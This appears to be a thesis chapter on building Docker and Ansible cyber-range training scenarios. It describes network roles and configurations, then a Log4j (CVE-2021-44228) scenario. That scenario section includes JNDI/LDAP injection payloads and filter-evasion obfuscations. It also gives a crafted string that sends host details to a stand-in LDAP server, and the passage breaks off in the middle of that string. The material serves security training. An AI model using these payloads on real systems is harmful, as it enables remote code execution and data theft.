\chapter{Validation}\label{chap:validation}

\minitoc

\section{Methodology} \label{sec:validation_methodology}

As a way to validate the stated hypothesis (\textit{cf.} Section \ref{sec:research_problem}), we have acted upon a thorough process that consists of the following phases:

\begin{enumerate}
    \item \textbf{IaC Tools in Cyber Range Construction}: The role of IaC tools in the context of cyber range construction. % Use Cases | Ansible | Docker 
    \item \textbf{Architecture}: Where details on how the scenario construction process was taken into account, as well as insights on the logic followed.% Ansible
    \item \textbf{Custom Scenarios}: From Linux to Windows-based scenarios, details on how they were developed will be presented and how they can be attacked.
    \item \textbf{Imported Scenarios}: The process of importing scenarios from previous CTF competitions and how they managed to fit in the previously developed scenario construction.
    \item \textbf{Scenario Extensibility}: Details on how new scenarios could be developed and the necessary changes to do so.
    \item \textbf{Cloud Deployment}: Insights on how the cloud deployment was taken into account using Microsoft Azure as the cloud provider.
    \item \textbf{User Interface Panel}: Presentation of the UI responsible for managing scenarios' in a sort of a CTF-level style.
\end{enumerate}


\section{IaC Tools in Cyber Range Construction} \label{sec:validation_iac_tools_in_cr_construction}

According to Masek \textit{et al.} \cite{unleashing_full_potential_of_ansible_ref} ``\textit{the goal of the IaC is to provide system administrators with the ability to manage knowledge and experiences of plenty of subsystems from one place instead of the traditional approach where each subsystem has its dedicated administrator}''. As in the case of this article, Ansible was the selected tool to simplify the orchestration and configuration management tasks related to our subject, as it gives the ability to create a set of YAML playbook files containing procedural instructions on how a target machine should be configured. Its flexibility in working both in Linux and Windows machines and how easy it was to deploy configurations were critical aspects for choosing this tool. 

Across the entire development, Docker was the selected tool responsible for provisioning Docker containers. As Ansible works on a client-only topology, the Ansible application does not need to be installed in the containers. Therefore, Ansible is responsible for both the creation and the issuing of commands to these containers, and as a result, we build an enterprise-level network entirely made of Docker containers by simply issuing a command. The entire process is relatively trivial as long as the necessary configuration files are created, as discussed later. The role of IaC here is phenomenal, as the deployment of our network consists of snippets of code used for declaring how our infrastructure should be configured, which is different from the traditional programming concepts we are currently used to.

Lastly, in particular, situations, as we will later see, Vagrant, was used in order to create Windows-based scenarios. Essentially the setup we built was a Windows Vagrant box running within the Linux Docker container, letting Windows-based types of attacks be successfully explored by the trainee. One question may arise: \textit{Why not use a Windows VM instead of a Vagrant box inside a Docker container?} The issue with this approach is that more storage will be needed if we intend to run several instances of the Windows VM. Instead, the Docker read-only image will stay the same if we use the first-mentioned approach.
Only the container that derives from that same image will change, adding its read-write layer that interacts with the Docker read-only image. As a result, the system uses way less storage. Concerning Windows-based VMs, a similar approach can be taken into account. In scenarios with more than one Windows VM, an optimal solution to reduce resource consumption would be to use a container with a hypervisor installed responsible for monitoring all the present Windows VMs, instead of having one hypervisor per Windows VM. This can be achieved using linked clones in Vagrant in which new VMs only differing in disk images are created using the parent disk image belonging to a master VM. Another key aspect of choosing this setup was consistency. We wanted to create scenarios based on containers and not use a hybrid approach that used containers and VMs separately. With this, we are ready to move into the architectural details of the project.

The engineering process, along with these tools, allowed us to obtain a set of cybersecurity training scenarios that can be run locally without needing an enormously complex infrastructure. More specifically, the lightweight containerization approach followed during the development allowed us to run complex scenarios with a distance of a command or click. In Chapter \textbf{CLOUD DEPLOYMENT}, we also discuss how we could export our set of cyber ranges into a remote machine again, with the help of Ansible, to perform every needed remote configuration.

\section{Architecture} \label{sec:validation_architecture}

The scenario construction process using Docker containers targeted enterprise-level networks. As such, corporate environments normally subdivide networks into three different main sections:

\begin{itemize}
    \item \textbf{External Network} refers to the public internet where machines are not controlled by the organization. As such, risk modeling activities should be taken into account in order to evaluate the risk and the probability specific threats and attack scenarios pose to the internals of the organization. With this, according to the organization's budget, decisions on which security measures to place in the company's network are considered and may include systems like Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), Firewalls, Antivirus, among others.
    \item \textbf{Internal Network} which contains the protected machines of an organization, such as internal databases and services only available to the company's employees and not to the general public.
    \item \textbf{Demilitarized Zone (DMZ)}, which is a network that protects the company's internal network and is targeted with untrustworthy traffic. It includes services available to the public and sits between the \textit{External Network} and the \textit{Internal Network}. It generally includes web servers, Domain Name System (DNS) servers, among others.
\end{itemize}

Our project focuses on these three distinct types of networks and considers several network services that we would typically see on enterprise networks, as depicted in Fig. \ref{fig:template_net}

The network architecture presented in Fig. \ref{fig:template_net} shows the services available on every Linux scenario, except for Windows-based scenarios, which slightly differ from this schema. As shown, Ansible appears as the tool responsible for configuring and provisioning the entire network.

\begin{figure}[H]
    \includegraphics[width=12cm]{figures/example.pdf}
    \caption{Template Network Architecture.}
    \label{fig:template_net}
\end{figure}

\subsection{Ansible Architecture} \label{sec:ansible_structure}

Three different playbooks include all the developed scenarios. The first is explicitly used in Linux-based scenarios, representing most designed challenges. The second is used for the Windows Ransomware scenario, and the last for the Windows Active Directory (AD) scenario. On each one of these playbooks, the first step is always to delete stale Docker containers from previous running scenario executions, as shown in Listing \ref{lst:ansible_removal_of_stale_containers}.

\begin{lstlisting}[language=yaml,caption=Removal of Stale Containers.,numbers=none,label={lst:ansible_removal_of_stale_containers}]
- hosts: localhost
  pre_tasks:
    - name: Remove Stale Containers
      ansible.builtin.include_tasks: teardown.yml
      loop: "{{ machines + vulnerables.machines }}"
      loop_control:
        loop_var: pc_info
\end{lstlisting}

Essentially, for every machine object passed, the contents of the \textit{teardown.yml} file are run. This uses the \textit{community.docker.docker\_container} module that is builtin in Ansible and removes the container under a given name.

\begin{lstlisting}[language=yaml,caption=File \textit{teardown.yml}.,numbers=none,label={lst:ansible_teardown}]
- name: Remove Stale Containers (name="{{ pc_info.name }}")
  community.docker.docker_container:
    name: "{{ pc_info.name }}"
    state: absent
\end{lstlisting}

\subsection{Ansible Groups and Inventory} \label{sec:ansible_groups_inventory}

% Inventory & Groups

Every machine belongs to a group, by default in Ansible, the \textit{all} group. Nonetheless, other groups and respective members were defined in the so-called Ansible Inventory, as presented in Listing \ref{lst:ansible_inventory}.

\begin{lstlisting}[caption=High-level view of Ansible Inventory.,numbers=none,label={lst:ansible_inventory},literate={=}{$\rightarrow{}$}{1}]
[routers]
[firewalls]
[external]
[internal]
    = [pcs]
    = [dhcp_servers]
[dmz]
    = [dns_servers]
    = [custom_machines] # Scenario's vulnerable machines.
    = [reverse_proxies]
\end{lstlisting}

As depicted in Listing \ref{lst:ansible_inventory}, each word represents a group of one or more machines. Each group may have several child groups defined by their name, as it happens above, or by machines, represented by their FQDN or IP address. We found groups themselves very useful when restricting certain tasks per group. Then, some groups contain child groups, as happens with the \textit{internal} and \textit{dmz} groups. In the case of Windows-based scenarios, another group called \textit{machine} is used and refers to the Docker container containing the Windows Vagrant box. Listing \ref{lst:ansible_inventory} was a very high-level view of how groups are organized within the project. A custom python inventory script was created to allow the specification of variables across each group.

\subsection{Generic Scenario Variables} \label{sec:generic_scenario_variables}

For each playbook, a set of variables are always defined corresponding to the generic structure of the network, as presented in Fig. \ref{fig:template_net}. We start with the Docker images used across the workflow, their path, and the default image name in case none is specified.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Images.,numbers=none,label={lst:ansible_vars_1}]
general:
  images:
    - name: kali_test_img
      path: ./attacker
    - name: base_image
      path: .
  default_container_image_name: base_image
\end{lstlisting}

As shown in Listing \ref{lst:ansible_vars_1}, we use two Docker images: \textit{base\_image} and \textit{kali\_test\_img}. The former is an image derived from \textit{node:lts-alpine} with some extra packages installed. The Alpine distribution was chosen due to its smaller size compared to other images. As a result, the \textit{base\_image} size is around 230MB. The \textit{kali\_test\_img} is an image derived from the official \textit{kalilinux/kali-rolling} Docker image. This image was extended to include the Xfce\footnote{\url{https://www.xfce.org/}} desktop environment, characterized by its low resource consumption and user-friendliness, as well as \textit{Virtual Network Computing} (VNC) package, which allows screen sharing and remote control from another device, meaning the computer screen, keyboard, and mouse are mapped from an external device to the device installed with VNC. Accessing port 6080 on the target machine makes it possible to obtain remote control over it, which will be later used in the scenarios. This Kali Linux image is especially suited for offensive tasks, and here the only concern was providing the trainee with a broad range of tools he could use in a scenario. Therefore, the image's size is much larger (around 11GB) compared to the \textit{base\_image} used for common network services.

The second category of Ansible variables for machines belonging to the \textit{all} group can be seen in Listing \ref{lst:ansible_vars_2}.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Networks.,numbers=none,label={lst:ansible_vars_2}]
networks:
  internal_net:
    network_addr: 172.{{ random_byte }}.0.0/24
    gateway_addr: 172.{{ random_byte }}.0.254
    random_byte: "{{ random_byte }}"

  dmz_net:
    network_addr: 172.{{ random_byte | int - 5 }}.0.0/24
    gateway_addr: 172.{{ random_byte | int - 5 }}.0.254
    random_byte: "{{ random_byte | int - 5 }}"

  external_net:
    network_addr: 172.{{ random_byte | int - 10 }}.0.0/24
    gateway_addr: 172.{{ random_byte | int - 10 }}.0.254
    random_byte: "{{ random_byte | int - 10 }}"
\end{lstlisting}

This section concerns Docker networks, according to the structure mentioned in Section \ref{sec:validation_architecture}. The range of each network is defined, as well as the gateway address which points to the host machine. This is mandatory by Docker, as the host machine should always take part in each created virtual Docker network so it can forward packets from and to it later. At last, the \textit{random\_byte} points to a random byte that changes across each scenario execution and confers some degree of randomization as for each new scenario execution, the network IP addresses will change. 

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Machines.,numbers=none,label={lst:ansible_vars_3}]
machines:
  - name: attackermachine
    image: kali_test_img
    volumes:
      - "/dev/net/tun:/dev/net/tun"
    group:
      - external
      - mesh
    published_ports: # There is also the exposed_ports when no mapping to the host machine is needed 
      - 5900:5900
      - 6080:6080
    dns: 
      name: edge_router
      network: external_net
    networks:
      - name: external_net
        ipv4_address: 172.{{ networks.external_net.random_byte }}.0.2
\end{lstlisting}

Listing \ref{lst:ansible_vars_3} presents a typical example of the attacker machine used for offensive tasks. Several attributes are specified according to the logic of a Docker container. We start by its name, the Docker image it uses, possible volumes (anonymous, named, or bind mounts), the groups the container belongs to, and published ports, meaning ports mapped between the Docker container and the host machine. Then, we specify the networks the container belongs to, which can be several, for instance, routers, and lastly, we specify where to find the DNS server. In this case, as the attacker machine is located in the external network, we redirect DNS queries to the edge router's network interface sitting in the external network so that these queries are later forwarded to the DNS server in the DMZ. This is achieved using \texttt{iptables} rules. For machines located inside the corporate network, DNS queries are sent directly to the DNS server sitting in the DMZ network without the need for any type of forwarding by the edge router. It is also important to mention other attributes that are also possible to be specified, namely the \textit{devices} and \textit{privilege} attributes. Although Listing \ref{lst:ansible_vars_3} provided only an example of the attacker machine, other network services follow a similar logic.

\subsection{Custom Scenario Variables} \label{sec:custom_scenario_variables}

After presenting how the standard setup for each scenario is organized, Listing \ref{lst:ansible_vars_4} shows how customized variables for each scenario are structured, starting with an example of a DNS configuration.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - DNS.,numbers=none,label={lst:ansible_vars_4}]
dns:
  - domain: example-domain.ui.com
    internal:
      machine: vuln_service
      network: dmz_net
    external:
      machine: edge_router
      network: external_net
\end{lstlisting}

Here, a domain named \textit{example-domain.ui.com} is presented along with \textit{internal} and \textit{external} specifications of it. This, as will later be explained, is related to two distinct DNS views that are defined. By ``internal view'' we refer to devices in the internal or DMZ networks; otherwise, they belong to the ``external view''. So, in the listing mentioned above, the \textit{example-domain.ui.com} domain points to the \textit{vuln\_service} container located in the DMZ whenever devices in the ``internal view'' look for this domain. Devices in the ``external view'' point to the external network interface of the edge router. This means resolved DNS requests made by external machines will go through the edge router and be forwarded to the respective machine. 

After talking about DNS, we will go over another set of variables, namely the set of custom machines.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Custom Images.,numbers=none,label={lst:ansible_vars_5}]
vulnerables:
  images:
    - name: unifi_log4j
      path: scenarios/log4j
      dockerfile: Dockerfile.alpine.mongo
      args:
        VERSION: "6.4.54"
\end{lstlisting}

Listing \ref{lst:ansible_vars_5}, similarly to \ref{lst:ansible_vars_1}, presents the set of Docker images from the collection of custom machines. Still, this representation is a bit more flexible, allowing the specification of the name of the``Dockerfile''' and arguments to be read in the Docker image creation process.

Then, in the vulnerable machines section, the situation is quite the same as in Listing \ref{lst:ansible_vars_3}. The only exception is the variables attribute specific to each machine.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Custom Machines.,numbers=none,label={lst:ansible_vars_6}]
vulnerables:
  machines:
    - name: reverse_proxy1
      image: reverse_proxy
      # ... #
      vars:
        - domain: adminbot.mc.ax
          targets: 
            - name: admin_bot_frontend
              network: dmz_net
              port: 3000
        - domain: adminbotapi.mc.ax
          targets: 
            - name: admin_bot_api
              network: dmz_net
              port: 8000
\end{lstlisting}

For instance, Listing \ref{lst:ansible_vars_6} refers to an NGINX reverse proxy that redirects requests according to a specified domain. The \textit{vars} attribute specifies which machine and port should be the network packets' target when communicating with a particular domain.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Port Forwarding.,numbers=none,label={lst:ansible_vars_7}]
port_forwarding:
  - destination_port: 443
    to_machine: reverse_proxy1
    to_network: dmz_net
    to_port: 443
\end{lstlisting}

Then, Listing \ref{lst:ansible_vars_7} references the port forwarding section especially relevant for external machines and how they can communicate with DMZ machines. 

\begin{itemize}
    \item \textit{destination\_port}: the incoming port on the edge router where packets will be redirected.
    \item \textit{to\_machine}: the target machine to which packet reaching the \textit{destination\_port} will be forward to.
    \item \textit{to\_network}: the network where the target machine is placed.
    \item \textit{to\_port}: the destination port in the target machine to where the edge router will redirect packets to.
\end{itemize}

Some names, such as \textit{destination\_port} and \textit{to\_port}, may be misleading. Still, they obey the convention used by \texttt{iptables}.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Setup Section.,numbers=none,label={lst:ansible_vars_8}]
setup:
    machines:
    -   name: localhost
        setup: "{{ playbook_dir }}/scenarios/chessrs/setup/"
    -   name: attackermachine
        setup: "{{ playbook_dir }}/scenarios/chessrs/attacker_machine_setup/*.j2"
\end{lstlisting}

Lastly, we have Listing \ref{lst:ansible_vars_8}, which provides information on where to find the setup instructions for the \textit{localhost} and attacker machines.

\subsection{Ansible Roles \& Network Services} \label{sec:ansible_roles}

The structure followed by Ansible used a feature called ``roles''. We used a different role for every milestone in the network configuration. Ansible allows defining specific variables and tasks for each role, making grouping an entire workflow into separate roles straightforward to reuse in the development cycle. The used folder structure can be viewed in Listing \ref{lst:ansible_roles}.

\begin{lstlisting}[caption=Ansible Roles' Folder Structure.,numbers=none,label={lst:ansible_roles}]
roles/
    base/             
    custom_machines/
    dhcp/
    dmz/
    dns/
    entrypoint/
    firewall/
    internal/
    internal_pcs/
    mesh/
    reverse_proxies/
    routers/
\end{lstlisting}

Each directory inside \textit{roles} represents a different role. Inside it, specific tasks are defined. The following sections detail the tasks present for each role. 

\subsubsection{Base Role} \label{sec:ansible_base_role}

The \textit{base} role is responsible for the scenario's initial tasks:

\begin{itemize}
    \item Start the Docker service.
    \item Building the scenario's Docker images, as presented in Listings \ref{lst:ansible_vars_1} and \ref{lst:ansible_vars_5}.
    \item Create the Docker networks, as presented in Listing \ref{lst:ansible_vars_2}.
    \item Create generic scenario's Docker containers, as presented in Listing \ref{lst:ansible_vars_3}.
    \item Assign each created container to one or more Ansible groups.
\end{itemize}

\subsubsection{DHCP Role} \label{sec:ansible_dhcp_role}

The \textit{DHCP} role is responsible for configuring the DHCP servers. At first, the \texttt{dhcp} package is installed. Then a template configuration file, as shown in Listing \ref{lst:dhcp_configuration_role}, is created. At last, the \texttt{dhcp} service daemon is started.

\begin{lstlisting}[caption=DHCP Server Template Configuration.,numbers=none,label={lst:dhcp_configuration_role}]
default-lease-time 600;
max-lease-time 7200;
authoritative;
option rfc3442-classless-static-routes code 121 = array of integer 8;

subnet 172.{{ networks.internal_net.random_byte }}.0.0 netmask 255.255.255.0 {
  range 172.{{ networks.internal_net.random_byte }}.0.64 172.{{ networks.internal_net.random_byte }}.0.127;
  option routers {{ ((machines | selectattr('name', '==', 'internal_router'))[0]['networks'] | selectattr('name', '==', 'internal_net') | map(attribute='ipv4_address')) | first }};
  option domain-name-servers {{ ((machines | selectattr('name', '==', 'dns_server'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address')) | first }};
}
\end{lstlisting}

Essentially, the DHCP lease is responsible for assigning an internal IP address with the last byte ranging from 64 to 127, pinpointing the router of the internal network as the gateway router, and updating the DNS server with the one placed in the DMZ network.

\subsubsection{Internal PCs Role} \label{sec:ansible_internal_pcs_role}

The \textit{internal PCs} role handles the behavior of machines inside the internal network. As such, it runs the following tasks:

\begin{itemize}
    \item Install the DHCP client package.
    \item Ask for a DHCP lease to the DHCP server.
    \item Removes the automatically assigned IP address by Docker so that its only IP address is the one stated by the DHCP server.
\end{itemize}

\subsubsection{Internal Role} \label{sec:ansible_internal_role}

The \textit{internal} role is destined for the internal machines and DHCP server. It simply configures each device's default route as the internal router's interface located in the internal network. Every time a default gateway or static route is configured across the Ansible setup, the \textit{iproute2} package, installed on each Docker image by default, is used, which allows controlling and monitoring various aspects of networking in the Linux kernel, namely routing, tunnels, network interfaces, traffic control, among others.

\subsubsection{DNS Role} \label{sec:ansible_dns_role}

The \textit{DNS} role is somewhat of a more complex role and is destined for DNS servers. It is responsible for running the following actions:

\begin{itemize}
    \item Install the \texttt{bind} DNS server package.
    \item It copies the necessary template DNS configuration files to the DNS server container.
    \item Starts the \texttt{named} DNS service.
\end{itemize}

Two Access Control Lists (ACLs) are created regarding the DNS configuration files. The \textit{internal} deals with which machines stand in the internal and DMZ networks, and the \textit{external} points to every other machine that is not part of the \textit{internal} ACL, meaning external machines only. Afterward, a distinction on the IP addresses retrieved by resolved domains for internal and external machines is made, according to what was presented in Listing \ref{lst:ansible_vars_4}. The actual configuration file is presented in Listing \ref{lst:dns_configuration_file}

\begin{lstlisting}[caption=DNS Server Template Configuration.,numbers=none,label={lst:dns_configuration_file}]
acl "exclude" {
    {{ (machines | selectattr('name', '==', 'edge_router'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address') | first }};
};

acl internals {
    !exclude;
    172.{{ networks.internal_net.random_byte }}.0.0/24;
    172.{{ networks.dmz_net.random_byte }}.0.0/24;
};

view "internal" {
    match-clients { internals; };

    {% for info in dns -%}
    zone "{{ info.domain }}" {
        type master;
        file "/var/bind/db.internal.{{ info.domain }}";
    };
    {% endfor +%}
};

view "external" {
    match-clients { any; };

    {% for info in dns -%}
    zone "{{ info.domain }}" {
        type master;
        file "/var/bind/db.external.{{ info.domain }}";
    };
    {% endfor +%}

    # ... #
};}
\end{lstlisting}

Notice the use of Jinja2\footnote{\url{https://jinja.palletsprojects.com/en}} templating. Essentially, we create an ACL named ``exclude'' which refers to the IP address of the edge router that will perform NAT-specific packets coming from outside the organization's network. Then, we create the ``internal'' and ``external'' views, as mentioned above, which direct to different DNS zones according to the mapped domain. If the DNS query does not match an internal domain, the request will be forwarded to the \texttt{8.8.8.8} Google's public DNS server.

\subsubsection{Router Role} \label{sec:ansible_router_role}

The next role leads us to the router's configuration steps. Here we distinguish the configuration of the internal router and the one of the edge router. 

The internal router takes a single action to configure its default gateway with the edge router's DMZ network interface, as this is the gateway that provides internet access to the network.

The edge router's task is to provide NAT to packets whose source matches the internal or DMZ networks. This is accomplished using the \texttt{MASQUERADE jump} of \texttt{iptables}. Lastly, a static route by specifying that packets destined to the internal network should be directed to the DMZ interface of the internal router.

\subsubsection{Custom Machines Role} \label{sec:ansible_custom_machines_role}

The \textit{custom machines} role is quite similar to the \textit{base} role except that it performs Docker image and container creation on the set of specific machines required by a scenario instead of the generic ones. Although both roles slightly differ, using just one role with some small conditionals would be possible. Still, the adopted approach allows more accessible future updates.

\subsubsection{DMZ Role} \label{sec:ansible_dmz_role}

The \textit{DMZ} role is also quite simple. Its target is the DNS servers, the custom machines, and reverse proxies. Two tasks are associated with this role: the static configuration route to the internal network, which directs packets to the internal router's interface on the DMZ network, and the configuration of the default gateway to access the internet, which points to the edge router's DMZ network interface.

\subsubsection{Reverse Proxies Role} \label{sec:ansible_reverse_proxies_role}

The \textit{reverse proxies} role, as the name suggests, targets the reverse proxies present in the network. These services sit in front of the scenario's custom machines and forward client requests to those machines. Essentially, they allow establishing HTTPS connections with the client device, handling all the SSL certificate-related tasks, and talking with the destination machine sitting in the back of the reverse proxy using an HTTP connection. In simple words, it works as a middle agent.

As presented in Listing \ref{lst:ansible_vars_6}, the variables defined for the reverse proxy include a domain and information on the target machine. We provide a piece of the NGINX configuration file at Listing \ref{lst:reverse_proxy_configuration_file}. Again, it allows the configuration of several domains specified using Jinja2 templates. The reverse proxy continuously listens for connections at port 443, and according to the selected domain, it forwards the traffic to the appropriate target. If requests are made to port 80, they are redirected to port 443, meaning the HTTP connection gets upgraded to HTTPS.

\begin{lstlisting}[caption=Reverse Proxy Template Configuration.,numbers=none,label={lst:reverse_proxy_configuration_file}]
http {
    sendfile on;
    large_client_header_buffers 4 32k;

    {%+ for vars in machine_vars %}
    
    upstream service-{{ loop.index }} {
    {% for target in vars.targets %}
    server {{ ((selected_machines | selectattr('name', '==', target.name))[0]['networks'] | selectattr('name', '==', target.network) | map(attribute='ipv4_address')) | first }}:{{ target.port }};
    {% endfor -%}
    }

    server {
        listen 80;
        server_name {{ vars.domain }};

        location / {
            return 301 https://$host$request_uri;
        }
    }

    server {
        listen 443 ssl;
        server_name {{ vars.domain }};

        ssl_certificate /etc/ssl/certs/{{ vars.domain }}.crt;
        ssl_certificate_key /etc/ssl/private/{{ vars.domain }}.key;

        location / {
            proxy_pass         http://service-{{ loop.index }};
            proxy_redirect     off;
            proxy_http_version 1.1;
            # ... #
        }
    }
    {% endfor %}
}
\end{lstlisting}

After copying the above-listed template configuration file to the reverse proxy, we must deal with SSL certificates. For this, we first created a Certificate Authority (CA) by defining an \texttt{openssl.cnf} file and the necessary folder structure, as well as generating the public and private keys associated to the CA.

The \textit{reverse proxies} role generates a Certificate Signing Request (CSR), a specially formatted encrypted message sent from an SSL digital certificate applicant to a CA. The CA then takes the CSR and generates a public-key certificate signed by itself. At last, it removes the password from the private key of the newly issued private key and copies both this file and the public-key certificate to the reverse proxy container. At last, it starts the NGINX service with the loaded configuration. 

One crucial aspect of this configuration is the signing of public-key certificates by the CA. This entails that the created root CA has to be trusted by machines that will eventually access the domain linked to the digital certificate, in this case, the attacker machine. To achieve such setup, the CA public-key certificate is loaded as trusted in this machine both system-wide and in Fiferox, as it will be later explained.

\subsubsection{Firewalls Role} \label{sec:ansible_firewalls_role}

The \textit{firewall} role focuses on the two existing routers which incorporate a firewall. During this explanation, we will refer to the internal router's firewall as the internal firewall, and to the edge router's firewall, we will refer to it as the external firewall. 

Starting with the internal firewall, the role performs the following \texttt{iptables} actions:

\begin{itemize}
    \item Set the forward chain's default policy to drop, meaning the internal router does not forward any traffic by default.
    \item Already established connections or connections previously associated with existing ones to the internal network are accepted.
    \item New, previously established, or related connections from the internal network are also accepted.
\end{itemize}

Concerning the external firewall, this role performs the following \texttt{iptables} actions:

\begin{itemize}
    \item \textbf{Generic Rules:}
        \begin{itemize}
            \item Set the forward chain's default policy to drop, meaning the internal router does not forward any traffic by default.
            \item Already established connections or connections previously associated with existing ones to the internal or DMZ networks are accepted.
            \item Packets from the internal or DMZ networks are also accepted in the forward chain.
        \end{itemize}
    \item \textbf{DNS Rules:}
        \begin{itemize}
            \item Set a ``prerouting'' chain rule in which TCP and UDP traffic reaching the edge router's port 53 will have its destination changed (DNAT) to the real DNS server sitting in the DMZ network and destination port 53.
            \item Forwarding traffic to the DNS server is accepted.
            \item A ``postrouting'' NAT rule is added to traffic whose destination is the DNS server.
        \end{itemize}
    \item \textbf{Port Forwarding Rules:}
        \begin{itemize}
            \item Allow TCP and UDP forwarding according to the information provided in the example of Listing \ref{lst:ansible_vars_7}. We consider the target machine and the target port number in this regard.
            \item Accept TCP and UDP traffic in the ``prerouting'' chain according to the information provided in the example of Listing \ref{lst:ansible_vars_7}. We consider the target machine and the destination port number in this regard.
            \item A ``postrouting'' NAT rule for the target machines as in the example of Listing \ref{lst:ansible_vars_7}.
        \end{itemize}
\end{itemize}

With both the internal and external firewalls, we intend to restrict the allowed traffic from the devices externally placed with respect to the organization's network. Only certain services in the DMZ should be allowed external access, never devices from the internal network. On the other hand, connections from inside the corporate network are allowed. This configuration uses \textit{iptables}. Therefore the rules are not based on highly-complex logic like which domains an internal device tries to access and if they should be blocked, according to a blocklist of IP addresses and domains.

\subsubsection{Entry point Role} \label{sec:ansible_entrypoint_role}

The \textit{entry point} role performs the necessary tasks to configure a certain machine, as defined at Listing \ref{lst:ansible_vars_8}. It creates the environment needed to run the setup scripts, which may include copying template files to the Docker container and then executing the entry point script. This role distinguishes when being conducted by the \textit{localhost} machine or a different machine. For the \textit{localhost}, the entry point script is run without any previous configuration. In the case of the other machines, the Jinja2 template setup files are first copied to the target container, and then the entry point script is run.

\subsubsection{Mesh Role} \label{sec:ansible_mesh_role}

The \textit{mesh} role handles devices that need to join the Tailscale network, called \textit{tailnet}. As explained in Section \ref{sec:selected_tools_tailscale}, this network allows communication between each device that belongs to it. This is useful when focusing on cloud deployments if we, for instance, want to connect to port 6080 on our attacker machine to be able to control it remotely and, as we will see, in the Windows-based scenarios to access the Windows Vagrant box using \textit{remote desktop}. 

This role's actions start by installing Tailscale and starting the \textit{tailscaled} service. After this, the container is instructed to join a specific Tailscale network using an authentication key and by specifying a hostname for the machine. An authentication key allows the addition of new nodes to the Tailscale network without needing to sign in to the network. A reusable authentication key was created to connect multiple nodes to the network. Each time a new node joins the Tailscale network using this authentication key, it enters the group of Tailscale ephemeral nodes, which essentially refer to short-lived devices that are automatically removed from the network after a short period of inactivity and are immediately removed from the network in case they are instructed to do so. Also, the usage of the same hostname for a particular machine allows accessing it using a Tailscale feature called ``MagicDNS'' which essentially registers all the DNS names for the network's devices using the following logic: \texttt{[Device Hostname].[Network DNS Name]}
The device's hostname was already mentioned above. By default, the network's DNS name is chosen by Tailscale upon the first usage. The ``MagicDNS'' configuration provides easy access to machines when they are not under our control. This will be very useful in the chapter of \textbf{CLOUD DEPLOYMENT}.

\section{Custom Scenarios} \label{sec:validation_custom_scenarios}

The set of custom scenarios involves three distinct cyber ranges:

\begin{itemize}
    \item A Linux scenario that explores the Apache Log4j vulnerability (CVE-2021-44228).
    \item A Windows-based scenario that explores a Ransomware malware executable that encrypts a set of files.
    \item A Windows-based scenario that exposes a vulnerable Active Directory Domain Controller that provides a vast attack surface where the trainee can experiment with several attacks. 
\end{itemize}

For each challenge, details on how to solve them will be revealed. We will present some of the intended solutions to get the secret flag and, when available, unintended solutions.

\subsection{Log4j Scenario} \label{sec:validation_log4j_scenario}

The Apache Log4j vulnerability started haunting the world during the last month of 2021. It was based on the Java-based logging package Apache Log4j and essentially allowed an attacker to execute code on a remote server, the so-called Remote Code Execution (RCE). The scope of machines this vulnerability targeted was enormous, and some put it on the same level as the most severe vulnerability along with \textit{Heartbleed} and \textit{Shellshock}. CVE-2021-4428\footnote{\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228}} details which Log4j versions were affected and give a brief insight into what is the vulnerability about. In simple words, an attacker that can control log messages may run arbitrary code by means of a process called message lookup substitution.

Back in 2013, there was an upgrade in the Log4j package: the ``JNDILookup plugin''. JNDI means Java Naming and Directory Interface and is a directory service that allows finding data in the form of a Java object through a directory. A directory service is a database for storing information on users and resources. It is often used to manage access privileges, monitor and control access to applications and infrastructure resources. JNDI supports a wide variety of directory services, being the most famous, the Lightweight Directory Access Protocol (LDAP). This was the most targeted directory service in Log4j exploits. Java programs may use JNDI and LDAP together to find a Java object containing specific data. For instance, an URL such as \texttt{ldap://localhost:389/o=FEUPThesis} retrieves information on the \textit{FEUPThesis} object from the LDAP server running in port 389 of the same machine. In this example, we used the combination \textit{localhost:389}, but the LDAP server could be located anywhere on the internet. If an attacker controls the above-mentioned LDAP URL then this means they can potentially cause a program to load a malicious object from a server under their control and get remote execution control over a machine.

Apache Log4j's syntax\footnote{\url{https://logging.apache.org/log4j/2.x/manual/configuration.html}} follows the pattern \texttt{\$\{prefix:name\}} where \texttt{prefix} is a lookup in the list of available lookups\footnote{\url{https://logging.apache.org/log4j/2.x/manual/lookups.html}}. Other examples, such as \texttt{\$\{java:version\}}, would also be accepted and, in this case, would retrieve the current version of Java. Lookup messages were allowed to be used in the Log4j configuration and logged messages. The latter was what caused the vulnerability.

All the attacker has to do is find an input that gets logged and add a malicious JNDI query that includes a malicious LDAP server controlled by the attacker. On web servers, logged information typically consists of the \textit{User-Agent} HTTP header or the inputted \textit{username}, for instance.

Some techniques can be used to evade simplistic blocking of strings like \texttt{\$\{jndi:ldap} by using some features of Log4j. For instance, we can use the \texttt{\$\{lower\}} feature which lowercases characters: \texttt{\$\{jndi:\$\{lower:l\}\$\{lower:d\}a\$\{lower:p\}://example.com/x\}}. The usage of the \texttt{:-} syntax enables the attacker to set a default value for a lookup, and if the value looked up does not exist, then the predefined default value is considered:

\texttt{\$\{jndi:\$\{env:NOTEXIST:-l\}d\$\{env:NOTEXIST:-a\}\$\{env:NOTEXIST:-p\}}


Similar techniques use strings like \texttt{\$\{\$\{::-j\}\$\{::-n\}\$\{::-d\}\$\{::-i\}}. Other techniques include encoding \textit{\$\{} as \textit{\%24\%7B} or \textit{\textbackslash u0024\textbackslash u007b}.

During this period of cyber war, there were attempts to gather information on the target machine using crafted strings. Several attempts were made to collect the machine users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, and hostnames, among others, as shown in Listing \ref{lst:log4j_crafted_string}.

\clearpage

\begin{lstlisting}[caption=Log4j Crafted String.,numbers=none,label={lst:log4j_crafted_string}]
${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
